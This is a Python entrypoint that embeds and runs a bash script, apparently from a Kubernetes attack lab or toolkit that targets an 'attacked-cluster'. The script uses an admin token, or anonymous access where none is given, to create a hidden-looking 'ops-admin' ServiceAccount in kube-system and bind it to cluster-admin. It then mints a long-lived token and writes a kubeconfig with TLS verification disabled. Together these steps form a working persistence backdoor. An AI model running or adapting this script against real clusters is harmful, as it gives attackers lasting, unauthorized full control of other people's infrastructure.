#!/usr/bin/env python3
"""Python entrypoint for kubeconfig-creation.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

# ================== Parameters ==================
APISERVER_HOST="$CONTROL_PLANE_NODE"
CLUSTER_NAME="attacked-cluster"
APISERVER_IP="$(command -v dig >/dev/null 2>&1 && dig +short "$APISERVER_HOST" A | head -n1 || true)"
APISERVER="${APISERVER:-https://${APISERVER_IP:-$APISERVER_HOST}:$CONTROL_PLANE_PORT}"

NAMESPACE="${NAMESPACE:-kube-system}"
SA_NAME="${SA_NAME:-ops-admin}"
CRB_NAME="${CRB_NAME:-ops-admin-crb}"

USER_NAME="${USER_NAME:-ops-admin}"
CONTEXT_NAME="${CONTEXT_NAME:-ops-admin@local}"
KUBECONFIG_OUT="${KUBECONFIG_OUT:-$DATA_PATH/KC6/ops-admin.kubeconfig}"

# TLS: WITHOUT CA
CURL_TLS=(-k)

# Auth header: if ADMIN_TOKEN in not null, use it; otherwise anonymous
if [[ -n "${ADMIN_TOKEN:-}" ]]; then
  HDR_AUTH=(-H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json")
else
  HDR_AUTH=(-H "Content-Type: application/json")
fi

# ================== Utils ==================
json_post() {
  # $1=url  $2=payload
  local url="$1" data="$2" resp status body
  resp=$(curl -sS "${CURL_TLS[@]}" "${HDR_AUTH[@]}" -X POST "$url" -d "$data" -w $'\n%{http_code}')
  status="${resp##*$'\n'}"
  body="${resp%$'\n'*}"
  echo "$status"
  printf '%s' "$body" > /tmp/body.json
}

ok_or_409() {
  # $1=status-code  $2=what
  if [[ "$1" =~ ^2[0-9][0-9]$ ]]; then
    echo "[+] $2: created"
  elif [[ "$1" == "409" ]]; then
    echo "[=] $2: already existing (ok)"
  else
    echo "[-] $2: HTTP $1"; cat /tmp/body.json; exit 1
  fi
}

need_bin() { command -v "$1" >/dev/null 2>&1 || { echo "[-] Needed '$1'"; exit 1; }; }

# ================== Precheck ==================
need_bin curl
need_bin jq

mkdir -p "$(dirname -- "$KUBECONFIG_OUT")"

# (Optional) download kubectl if not present
if ! command -v kubectl >/dev/null 2>&1; then
  echo "[*] Downloading kubectl..."
  curl -fsSLo /usr/local/bin/kubectl "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
  chmod +x /usr/local/bin/kubectl
fi

echo "[i] API server: $APISERVER"
echo "[i] Namespace:  $NAMESPACE"
echo "[i] SA:         $SA_NAME"
echo "[i] CRB:        $CRB_NAME"

# ================== Create ServiceAccount ==================
echo "[*] Creating ServiceAccount (if missing)..."
status=$(json_post \
  "${APISERVER}/api/v1/namespaces/${NAMESPACE}/serviceaccounts" \
  "$(jq -n --arg name "$SA_NAME" '{apiVersion:"v1",kind:"ServiceAccount",metadata:{name:$name}}')"
)
ok_or_409 "$status" "ServiceAccount ${NAMESPACE}/${SA_NAME}"

# ================== Create ClusterRoleBinding ==================
echo "[*] Creating ClusterRoleBinding (if missing)..."
status=$(json_post \
  "${APISERVER}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \
  "$(jq -n --arg crb "$CRB_NAME" --arg sa "$SA_NAME" --arg ns "$NAMESPACE" '
    {
      apiVersion:"rbac.authorization.k8s.io/v1",
      kind:"ClusterRoleBinding",
      metadata:{name:$crb},
      roleRef:{apiGroup:"rbac.authorization.k8s.io",kind:"ClusterRole",name:"cluster-admin"},
      subjects:[{kind:"ServiceAccount",name:$sa,namespace:$ns}]
    }')"
)
ok_or_409 "$status" "ClusterRoleBinding ${CRB_NAME}"

# ================== TokenRequest ==================
echo "[*] Request token bound for SA..."
status=$(json_post \
  "${APISERVER}/api/v1/namespaces/${NAMESPACE}/serviceaccounts/${SA_NAME}/token" \
  '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":360000}}'
)
if [[ "$status" != "201" && "$status" != "200" ]]; then
  echo "[-] TokenRequest HTTP $status"; cat /tmp/body.json; exit 1
fi
SA_TOKEN=$(jq -r '.status.token // empty' /tmp/body.json)
if [[ -z "$SA_TOKEN" || "$SA_TOKEN" == "null" ]]; then
  echo "[-] Token not obtained:"; cat /tmp/body.json; exit 1
fi

# ================== Quick verification of token ==================
echo "[*] Verifying token with /api..."
http=$(curl -sS "${CURL_TLS[@]}" -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${SA_TOKEN}" "${APISERVER}/api" || true)
if [[ "$http" != "200" && "$http" != "403" ]]; then
  echo "[-] Token not accepted by API server (HTTP $http)"; exit 1
fi

# ================== kubeconfig (insecure) ==================
echo "[*] Generating kubeconfig: ${KUBECONFIG_OUT}"
cat > "${KUBECONFIG_OUT}" <<EOF
apiVersion: v1
kind: Config
clusters:
- name: ${CLUSTER_NAME}
  cluster:
    server: ${APISERVER}
    insecure-skip-tls-verify: true
users:
- name: ${USER_NAME}
  user:
    token: ${SA_TOKEN}
contexts:
- name: ${CONTEXT_NAME}
  context:
    cluster: ${CLUSTER_NAME}
    user: ${USER_NAME}
current-context: ${CONTEXT_NAME}
EOF

echo "[+] Done"
echo "    KUBECONFIG=${KUBECONFIG_OUT} kubectl auth can-i '*' '*' --all-namespaces"
echo "    KUBECONFIG=${KUBECONFIG_OUT} kubectl get ns"
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
